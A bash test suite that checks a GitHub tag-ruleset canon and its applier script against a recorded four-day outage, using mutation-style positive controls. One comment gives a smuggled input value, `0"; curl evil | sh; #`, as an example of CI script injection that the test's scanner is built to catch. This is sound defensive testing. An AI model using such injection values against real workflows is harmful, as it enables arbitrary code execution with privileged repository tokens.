#!/usr/bin/env bash
# SPDX-License-Identifier: MPL-2.0
# SPDX-FileCopyrightText: 2026 Jonathan D.A. Jewell
#
# test_tag_ruleset_canon.sh — structural guards on the tag-ruleset canon and on
# the applier that deploys it. These exist because of a measured four-day
# outage: on 2026-09-11 a body carrying a `creation` rule and an EMPTY
# `bypass_actors` list was committed to config/rulesets/ and deployed to 372
# repositories, after which nobody -- including the owner -- could create a tag
# anywhere. CodeRabbit corrected the file the next morning; the correction was
# never re-deployed, because nothing committed reads config/rulesets/.
#
# These are the properties a red MUST be able to name:
#
#   1. CANON IS USABLE: the tag canon restricts `creation` but keeps at least one
#      bypass actor. A tag ruleset with `creation` and zero bypass actors is not
#      "strict", it is an outage, and it is exactly what shipped.
#   2. NO CASE COLLISION: at most one file in config/rulesets/ declares a
#      tag ruleset over ~ALL. Two files whose names differ only by case
#      (`Immutable-Tags.json` vs `immutable-tags.json`) is how the wrong body
#      got deployed while the right one sat beside it.
#   3. IDENTITY, NOT NAME: the applier must never classify a live ruleset by its
#      `name`, and must strip `name` from a PUT body — GitHub keeps whatever name
#      an existing ruleset has, so sending one silently renames it. Measured:
#      372 repos named `Immutable-Tags` were blocked, 26 with that same name were
#      not, and 2 named `Immutable Tags` were healthy. The name classifies
#      nothing.
#   4. TWO-STEP READ: the applier must GET each ruleset by id. The LIST endpoint
#      omits `conditions`, `rules` and `bypass_actors`, so filtering the list
#      matches nothing (0 of 178 live repos) and every PUT silently becomes a
#      POST, recreating the duplicate-ruleset outage.
#   5. NO SILENT WEAKER FALLBACK: the applier must not carry a second, admin-only
#      canon body to fall back on when an App is not installed. One body
#      everywhere is the decision; a fallback re-creates a two-variant estate.
#   6. FAIL CLOSED ON DUPLICATES: rulesets are ADDITIVE, so a zero-bypass rival
#      blocks tags even beside a healthy sibling. The applier must refuse a repo
#      carrying two rather than guessing.
#   7. WRITES ARE OPT-IN: the applier reports unless `--apply` is passed.
#   8. CREDENTIAL IS ASSERTED: an absent secret resolves to an empty string in
#      silence; the applier must exit non-zero before enumerating anything.
#  13. DISABLED IS NEVER SILENTLY REVIVED: the identity rule is target +
#      conditions, so a ruleset a human switched OFF still matches it, and the
#      canon body carries "enforcement": "active". Without a guard the next
#      scheduled run turns it back on and says nothing. 375 branch rulesets on
#      this estate were disabled deliberately on 2026-09-22; an applier with
#      that shape undoes such a decision invisibly.
#   9. BOTH OWNERS ENUMERATED: `user/repos?affiliation=owner` returns ZERO
#      organisation repositories. metadatastician is an organisation, and a
#      census from the user endpoint alone silently missed 212 live repos.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CANON="$ROOT/config/rulesets/immutable-tags.json"
APPLIER="$ROOT/scripts/apply-tag-ruleset-canon.sh"
RULESET_DIR="$ROOT/config/rulesets"
pass=0; fail=0
ok()  { echo "PASS: $1"; pass=$((pass+1)); }
bad() { echo "FAIL: $1"; fail=$((fail+1)); }

command -v jq >/dev/null || { echo "FAIL: jq is required by this test"; exit 1; }
[ -f "$CANON" ]   || { echo "FAIL: canon missing: config/rulesets/immutable-tags.json"; exit 1; }
[ -f "$APPLIER" ] || { echo "FAIL: applier missing: scripts/apply-tag-ruleset-canon.sh"; exit 1; }

# --- 1. canon is usable -----------------------------------------------------
jq -e '.target == "tag"' "$CANON" >/dev/null 2>&1 \
  && ok "canon targets tag" || bad "canon .target is not \"tag\""
jq -e '.conditions.ref_name.include == ["~ALL"]' "$CANON" >/dev/null 2>&1 \
  && ok "canon include is exactly [\"~ALL\"]" \
  || bad "canon include is not exactly [\"~ALL\"] — the identity rule would not match it"
if jq -e '[.rules[].type] | index("creation")' "$CANON" >/dev/null 2>&1; then
  if jq -e '(.bypass_actors | length) >= 1' "$CANON" >/dev/null 2>&1; then
    ok "canon restricts creation AND keeps $(jq '.bypass_actors|length' "$CANON") bypass actor(s)"
  else
    bad "canon has a creation rule and ZERO bypass actors — this is the 2026-09-11 outage body, not a stricter policy"
  fi
else
  bad "canon has no creation rule; immutable tags are not immutable"
fi
jq -e '.enforcement == "active"' "$CANON" >/dev/null 2>&1 \
  && ok "canon enforcement is active" || bad "canon is not actively enforced"

# --- 2. no case-colliding tag-~ALL sibling ----------------------------------
# Note: config/rulesets/tag-floor.json (ruling D94) is the creation-free base
# floor (deletion + non_fast_forward only). Immutable-tags canon files restrict
# `creation`; at most one such file may exist (`Immutable-Tags.json` vs
# `immutable-tags.json` is the case-collision this check guards against).
tagfiles=()
for f in "$RULESET_DIR"/*.json; do
  [ -e "$f" ] || continue
  if jq -e '.target == "tag" and (.conditions.ref_name.include == ["~ALL"]) and ([.rules[].type] | index("creation") != null)' "$f" >/dev/null 2>&1; then
    tagfiles+=("$(basename "$f")")
  fi
done
if [ "${#tagfiles[@]}" -eq 1 ]; then
  ok "exactly one immutable-tags (creation-restricting) tag/~ALL ruleset file: ${tagfiles[0]}"
else
  bad "${#tagfiles[@]} immutable-tags tag/~ALL ruleset files (${tagfiles[*]-none}) — a case-collision here deployed the wrong body for four days"
fi

# --- 3..9. applier guards ---------------------------------------------------
grep -q 'del(.name)' "$APPLIER" \
  && ok "applier strips name from the PUT body" \
  || bad "applier does not del(.name) — a PUT carrying name silently RENAMES the live ruleset"
if grep -qE 'select\([^)]*\.name *==' "$APPLIER"; then
  bad "applier selects a live ruleset by .name — the name classifies nothing"
else
  ok "applier never selects a live ruleset by .name"
fi
# The read must be a GET, and it must be the payload that gets CLASSIFIED.
# Do NOT relax this to a bare 'rulesets/$id' match: a PUT and a DELETE also
# address a ruleset by id, so such a grep is satisfied by a WRITE and stays
# green while the classification loop reads the shapeless LIST summary. That
# exact inert assertion was caught by mutation testing on 2026-09-15.
loop_get=$(grep -cE 'gh api "repos/\$repo/rulesets/\$\{?id\}?"' "$APPLIER" || true)
if [ "$loop_get" -ge 1 ]; then
  ok "applier GETs each ruleset by id in the classification loop (two-step read)"
else
  bad "applier never GETs an individual ruleset per repo — the LIST endpoint omits conditions/rules/bypass_actors, so filtering the list matches NOTHING (0 of 178 measured)"
fi
# Inverse limb: the LIST payload must never be the thing whose shape is read.
list_var=$(grep -oE '[a-z_]+=\$\(gh api "repos/\$repo/rulesets\?' "$APPLIER" \
  | grep -oE '[a-z_]+=' | head -1 | tr -d '=')
if [ -z "$list_var" ]; then
  bad "cannot locate the ruleset LIST call — the two-step inverse check cannot run"
elif grep -qE "\\\$$list_var\"?\)?[[:space:]]*\\|[[:space:]]*jq[^|]*(bypass_actors|\\.rules|conditions)" "$APPLIER" \
  || grep -qE "^[[:space:]]*d=\"?\\\$$list_var" "$APPLIER"; then
  bad "applier reads the shape (conditions/rules/bypass_actors) out of the LIST payload \$$list_var — that summary omits all three"
else
  ok "the LIST payload ($list_var) is used only to enumerate ids, never for the shape"
fi
# Check CODE, not prose: every ruleset body the applier sends must derive from
# the canon FILE, so there can be no second, weaker body to fall back on. A
# comment explaining why there is no fallback must not trip this.
bodies_from_canon=$(grep -cE '^CANON_(PUT|POST)=\$\(jq .*"\$CANON_FILE"' "$APPLIER" || true)
inline_bodies=$(grep -nE 'gh api --method (PUT|POST) "repos/[^"]*/rulesets' "$APPLIER" \
  | grep -vE '\$CANON_(PUT|POST)' | grep -vc 'probe_' || true)
if [ "$bodies_from_canon" -eq 2 ] && [ "$inline_bodies" -eq 0 ]; then
  ok "every ruleset body derives from the canon file; no second/weaker body exists"
else
  bad "applier sends a ruleset body not derived from the canon file (from_canon=$bodies_from_canon inline=$inline_bodies) — a fallback body re-creates a two-variant estate"
fi
# 8b. The gate must accept either credential source, and neither must pass.
if grep -qE 'gh auth status' "$APPLIER" && grep -qE '\$\{GH_TOKEN:-\}' "$APPLIER"; then
  ok "credential gate accepts an explicit token OR an authenticated CLI"
else
  bad "credential gate accepts only one credential source — an applier that cannot be run by hand is an applier that never runs"
fi
# Scope this to the GATE BLOCK. A bare grep for 'exit 3' anywhere in the file is
# satisfied by the probe's own exit and stays green while the gate is gutted --
# caught by mutation testing on 2026-09-15, the same inert-assertion class as the
# two-step check above.
GATE_SRC="$APPLIER"
gate_block=$(awk '/^if \[ -n "\$\{GH_TOKEN:-\}" \]; then/{f=1} f{print} f&&/^fi$/{exit}' "$APPLIER")
if grep -qE '^[[:space:]]*exit 3[[:space:]]*$' <<<"$gate_block"; then
  ok "the credential gate itself exits non-zero when neither credential exists"
else
  bad "the credential gate does not exit inside its own else branch — an absent secret resolves to an empty string in silence and the sweep writes nothing while reporting success"
fi
grep -q 'DUPLICATE-FAIL-CLOSED' "$APPLIER" \
  && ok "applier fails closed on a repo carrying two matching tag rulesets" \
  || bad "applier does not fail closed on duplicates — rulesets are additive, so a rival blocks despite a healthy sibling"
grep -q 'APPLY=0' "$APPLIER" \
  && ok "applier defaults to report-only; writes need --apply" \
  || bad "applier does not default to report-only"
grep -q 'exit 3' "$APPLIER" && grep -q 'GH_TOKEN' "$APPLIER" \
  && ok "applier asserts a credential and exits 3 when absent" \
  || bad "applier does not fail on an absent credential — an empty secret would report a clean sweep over nothing"
grep -q 'orgs/\$org/repos' "$APPLIER" && grep -q 'user/repos?affiliation=owner' "$APPLIER" \
  && ok "applier unions the user listing with an org listing" \
  || bad "applier does not enumerate both owners — the user endpoint returns ZERO org repos"
bash -n "$APPLIER" 2>/dev/null \
  && ok "applier parses" || bad "applier is not valid bash"
[ -x "$APPLIER" ] \
  && ok "applier is executable" || bad "applier is not executable"

# --- Property 11: a free-plan 403 is a PLAN CEILING, never a retryable failure ----
# Rulesets are a paid feature on a PRIVATE repo, so a free-plan owner answers 403
# "Upgrade to GitHub Pro or make this repository public" even with admin rights --
# measured 5/5 on metadatastician's private repos, 46/46 OK on hyperpolymath's.
# No credential, no App install and no retry lifts it. If the applier books those
# as FAILED and bumps rc, this workflow stays red FOREVER after everything else
# converges, and a fail-loud signal that can never go quiet becomes noise.
# Anchor on the DISTINCT STATE and on the ABSENCE of an rc bump in that arm --
# not on the mere presence of the 403 string, which a log line would also satisfy.
plan_arm=$(awk "/Upgrade to GitHub Pro. \"\\\$api_err\"/,/^  fi\$/" "$APPLIER")
if [ -z "$plan_arm" ]; then
  plan_arm=$(awk '/if grep -q .Upgrade to GitHub Pro./{f=1} f{print} f&&/^  fi$/{exit}' "$APPLIER")
fi
if grep -q 'PLAN-EXCLUDED' <<<"$plan_arm"; then
  ok "a free-plan 403 gets its own terminal state, distinct from FAILED"
else
  bad "a free-plan 403 is not distinguished from a real fault — 5 permanently-unfixable repos would look like 5 transient retryables forever"
fi
# Inverse limb: the PLAN-EXCLUDED arm must NOT set rc. If it does, the weekly run
# can never go green no matter how many repos converge.
if grep -q 'rc=2' <<<"$(awk '/PLAN-EXCLUDED/,/^    else$/' <<<"$plan_arm")"; then
  bad "the PLAN-EXCLUDED arm bumps rc — the scheduled run would be permanently red on repos that CANNOT be fixed"
else
  ok "the PLAN-EXCLUDED arm leaves rc alone (a plan ceiling is not drift)"
fi
# And a genuine, non-plan list failure must STILL be a hard failure.
if grep -q 'rc=2' <<<"$(awk '/^    else$/,/^    fi$/' <<<"$plan_arm")"; then
  ok "a non-plan list failure still bumps rc (real faults stay loud)"
else
  bad "a real list failure no longer bumps rc — the plan carve-out swallowed genuine faults too"
fi

# --- Property 12: the credential probe must not confuse EXHAUSTED with ABSENT ----
# MEASURED 2026-09-15 03:09Z: `gh auth status` reported "The token ... is invalid"
# while the account was merely RATE-LIMITED and the token was perfectly good. A gate
# that trusts that verdict aborts with a FALSE "no credential" and sends the operator
# to `gh auth login`, destroying a working credential to cure a condition that clears
# itself. So the gate must classify THREE ways and must NOT use `gh auth status` as
# the authority. Anchored on the distinct arm and its distinct exit code.
if grep -q 'rate limit exceeded' "$GATE_SRC" && grep -qE '^[[:space:]]*exit 5[[:space:]]*$' <<<"$gate_block"; then
  ok "the gate distinguishes an EXHAUSTED rate limit from an ABSENT credential (own exit code)"
else
  bad "the gate cannot tell a rate-limited account from an uncredentialled one — it would print a FALSE 'no credential' FATAL and tell the operator to re-auth, throwing away a working token"
fi
# Inverse limb: `gh auth status` must not be the thing the gate branches on.
if grep -qE '(if|elif)[^#]*gh auth status' <<<"$gate_block"; then
  bad "the gate branches on 'gh auth status', which MISREPORTS a rate-limited account as holding an invalid token"
else
  ok "the gate does not branch on 'gh auth status' (it answers a different question than the consumer asks)"
fi
# And the rate-limit arm must tell the operator NOT to re-authenticate, because the
# obvious remedy is the destructive one.
if grep -qi "DO NOT run 'gh auth login'" <<<"$gate_block"; then
  ok "the rate-limit arm warns against the destructive remedy"
else
  bad "the rate-limit arm does not warn against 'gh auth login' — the operator's obvious next move destroys a valid credential"
fi


# ---------------------------------------------------------------------------
# 13. NO EXPRESSION IN A `run:` BODY. GitHub evaluates a ${ {…} } expression and
#     splices the RESULT into the script text before bash ever parses it, so an
#     input pasted into a run body is CWE-94 script injection: a dispatch with
#     limit = `0"; curl evil | sh; #` executes arbitrary code in a job holding a
#     GitHub App installation token with administration:write over 439 repos.
#     MEASURED: the first version of this workflow did exactly that on three
#     steps, and SonarCloud failed the PR with "E Security Rating on New Code" —
#     the only required context that was red for a reason belonging to this
#     branch. Inputs must arrive through `env:`, where they are data.
WF="$ROOT/.github/workflows/tag-ruleset-canon.yml"
# shellcheck disable=SC2016
scan_run_bodies() {
  awk '
    /^ *run: *\|/ { match($0, /^ */); ind = RLENGTH; inrun = 1; next }
    inrun {
      if ($0 ~ /^[[:space:]]*$/) next
      match($0, /^ */); cur = RLENGTH
      if (cur <= ind) { inrun = 0; next }
      if (index($0, "${{")) print FILENAME ":" NR ": " $0
    }
  ' "$1"
}
if [ ! -f "$WF" ]; then
  bad "the applier workflow is missing — the injection guard cannot run"
else
  hits=$(scan_run_bodies "$WF")
  if [ -z "$hits" ]; then
    ok "no GitHub expression is interpolated into any run: body (no script injection)"
  else
    bad "a GitHub expression is spliced into a run: body — CWE-94 script injection in a job holding administration:write: $(printf '%s' "$hits" | head -3 | tr '\n' ' ')"
  fi

  # POSITIVE CONTROL. An assertion that only ever reports "clean" is worthless
  # unless it has been shown to go red. Feed the same scanner a workflow that
  # IS injectable and require a hit; otherwise the green above proves nothing.
  ctl=$(mktemp)
  cat > "$ctl" <<'CTL'
jobs:
  x:
    steps:
      - name: injectable
        run: |
          echo "LIMIT=${{ inputs.limit }}"
CTL
  if [ -n "$(scan_run_bodies "$ctl")" ]; then
    ok "the injection scanner detects a known-bad workflow (positive control)"
  else
    bad "the injection scanner does NOT flag a deliberately injectable run body — the clean result above is meaningless"
  fi
  rm -f "$ctl"

  # The fix must not have been a feature deletion: every input still has to reach
  # the script. Each IN_* name must be BOTH declared in an env: block and read in
  # a run body, or the flag it controls has silently stopped working.
  missing=""
  for v in IN_APPLY IN_RECONCILE IN_LIMIT; do
    grep -q "^ *$v: " "$WF" || missing="$missing $v(env)"
    grep -q "\$$v" "$WF" || missing="$missing $v(use)"
  done
  if [ -z "$missing" ]; then
    ok "each workflow input still reaches the applier through an env: variable"
  else
    bad "the injection fix dropped an input instead of rerouting it:$missing"
  fi
fi
# --- Property 13: a DISABLED ruleset is never silently re-enabled -----------
# Detector, not a grep-for-a-string: it locates the guard, the PUT and the
# default, and requires the guard to sit BEFORE the write and to leave the
# repo alone. A test that only asserted the flag's name would still pass if
# the guard were moved after the PUT, or made to fall through.
disabled_guard_holds() {
  local f="$1" lg lput lcont
  # default must be OFF -- a guard that defaults to permissive is not a guard
  grep -qE '^APPLY=0 .*REVIVE_DISABLED=0' "$f" || return 1
  grep -qE '^ *--revive-disabled\)' "$f"      || return 1
  lg=$(grep -nE '\[ "\$enf" != "active" \] && \[ "\$REVIVE_DISABLED" -eq 0 \]' "$f" | head -1 | cut -d: -f1)
  [ -n "$lg" ] || return 1
  lput=$(grep -nF -- '--method PUT "repos/$repo/rulesets/$id"' "$f" | head -1 | cut -d: -f1)
  [ -n "$lput" ] || return 1
  [ "$lg" -lt "$lput" ] || return 1
  # the guarded arm must actually stop: a `continue` within the next 3 lines
  lcont=$(sed -n "$((lg+1)),$((lg+3))p" "$f" | grep -c 'continue')
  [ "$lcont" -ge 1 ] || return 1
  return 0
}

if disabled_guard_holds "$APPLIER"; then
  ok "a disabled ~ALL tag ruleset is reported, not PUT back to active (guard precedes the write, default off)"
else
  bad "the applier would PUT the canon body -- enforcement: active -- over a ruleset somebody deliberately disabled"
fi

# Positive control. The detector above is worthless unless it can say NO.
MUT_T="$(mktemp)"
awk '/\[ "\$enf" != "active" \] && \[ "\$REVIVE_DISABLED" -eq 0 \]/{skip=4} skip>0{skip--; next} {print}' \
  "$APPLIER" > "$MUT_T"
if cmp -s "$MUT_T" "$APPLIER"; then
  bad "property 13 mutant was not applied -- the awk pattern no longer matches the applier"
elif ! bash -n "$MUT_T" 2>/dev/null; then
  bad "property 13 mutant is not valid bash, so its red measures the parser and not the guard"
elif disabled_guard_holds "$MUT_T"; then
  bad "property 13 detector passes an applier with the guard REMOVED -- it asserts nothing"
else
  ok "property 13 mutant killed: with the guard stripped the detector refuses"
fi
rm -f "$MUT_T"

# --- Property 14: .source_type == "Repository" enforced before PUT (#1032) ---
source_type_guard_holds() {
  local f="$1" lref lrepo lput
  lref=$(grep -nF 'REFUSED-NO-SOURCE-TYPE' "$f" | head -1 | cut -d: -f1)
  lrepo=$(grep -nF '.source_type=="Repository" and .target=="tag"' "$f" | head -1 | cut -d: -f1)
  lput=$(grep -nF -- '--method PUT "repos/$repo/rulesets/$id"' "$f" | head -1 | cut -d: -f1)
  [ -n "$lref" ] && [ -n "$lrepo" ] && [ -n "$lput" ] || return 1
  [ "$lref" -lt "$lrepo" ] && [ "$lrepo" -lt "$lput" ] || return 1
  grep -qF 'ORG-INHERITED' "$f" || return 1
  return 0
}

if source_type_guard_holds "$APPLIER"; then
  ok "applier checks .source_type == \"Repository\" before PUT and fails closed on missing .source_type (#1032)"
else
  bad "applier does not enforce .source_type == \"Repository\" before PUT (#1032)"
fi

MUT_S="$(mktemp)"
sed 's/\.source_type=="Repository" and //' "$APPLIER" > "$MUT_S"
if cmp -s "$MUT_S" "$APPLIER"; then
  bad "property 14 mutant was not applied"
elif ! bash -n "$MUT_S" 2>/dev/null; then
  bad "property 14 mutant is not valid bash"
elif source_type_guard_holds "$MUT_S"; then
  bad "property 14 detector passes an applier with .source_type==\"Repository\" stripped"
else
  ok "property 14 mutant killed: stripping .source_type==\"Repository\" fails the detector"
fi
rm -f "$MUT_S"

echo "---"
echo "passed=$pass failed=$fail"
[ "$fail" -eq 0 ]
